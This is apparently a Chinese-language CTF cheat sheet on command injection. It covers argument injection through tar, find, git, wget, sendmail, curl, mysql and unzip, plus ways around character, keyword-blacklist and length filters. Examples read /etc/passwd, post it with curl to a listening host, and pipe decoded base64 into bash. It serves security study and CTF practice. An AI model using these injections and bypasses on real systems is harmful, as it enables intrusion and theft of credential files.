# 带限制的shell命令执行

## 收藏文章

 [https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/](https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/) 

https://www.anquanke.com/post/id/107336

## 可控位置

### 参数部分可控

1. 尝试用`;,&,|,反引号`等来直接执行命令
2. 限制第一种情况,翻一翻参数表,找到可利用的参数



#### 参数注入

##### tar

关键参数:--use-compress-program=

可以造成命令执行

例子:

```shell
tar --use-compress-program='cat /etc/passwd' -cf 2.tar *
cat 2.tar
```



##### find

关键参数: -exec 

例子:` find . -type f -exec 命令 \; -quit`

` find . -type f -exec cat /etc/passwd \; -quit`

` find . -type f -exec echo hello \; -quit`



##### git

关键参数:--open-files-in-pager=

例子:`git grep -i --line-number -e '--open-files-in-pager=命令;' master`

##### wget

关键参数:--directory-prefix

下载example.php

```php
$url = 'http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```

下载并将其保存在特殊位置

```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```

##### sendmail

发送mail.txt。设置来信人为:from@sth.com

`sendmail -t -i -f from@sth.com < mail.txt`

打印/etc/passwd的内容

`sendmail -t -i -f from@sth.com -C/etc/passwd -X/tmp/output.txt < mail.txt`

##### curl

关键参数:-F

下载网页内容:

`curl http://example.com`

将/etc/passwd 发送到http://example.com:xxxx配合监听获取文件内容

`curl -F password=@/etc/passwd http://example.com`

![](http://ww1.sinaimg.cn/large/006pWR9agy1g68qtlpvsqj30nj0iiq4n.jpg)

##### mysql

执行sql语句

`mysql -uuser -ppassword -e  SELECT sth FROM table`

执行命令

`mysql -uuser -ppassword -e  \! 命令`

##### untar

Unpack all `*.tmp` files from `archive.zip` into `/tmp` directory.

```
$zip_name = 'archive.zip';
system(escapeshellcmd('unzip -j '.$zip_name.' *.txt -d /aa/1'));
```

Unpack all `*.tmp` files from `archive.zip` into `/var/www/html` directory.

```
$zip_name = '-d /var/www/html archive.zip';
system('unzip -j '.escapeshellarg($zip_name).' *.tmp -d /tmp');
```

### 命令部分可控



1. 尝试直接执行命令



## 限制条件

### 字符限制

#### 利用linux统配符来匹配文件绕过字符限制

执行cat命令可以用

`/b?n/c?t .....`



#### 某些特殊字符的相互替换

##### 空格

\t和\r和\n代替空格

`$IFS$9` 符号 `${IFS}` 符号代替空格



### 单词黑名单

#### 利用"",'',和\`\` 来绕过单词黑名单

如`l''s,l""s`,l\`\`s

#### 利用字符串操作如base64,rot等等来绕过单词黑名单

\`echo "base64编码"|base64 -d\`和`echo "base64编码"|base64 -d|bash`

#### 变量名拼接

`a=ec;b=ho;$a$b hello`





### 输入长度限制

#### 短命令执行

 [https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/](https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/) 

关键命令:

- ls 

-t :按照最后修改时间排序

- sh

#### 实例

```shell
>lo\\
>\ hel\\
>echo\\
ls -t>_
sh _
```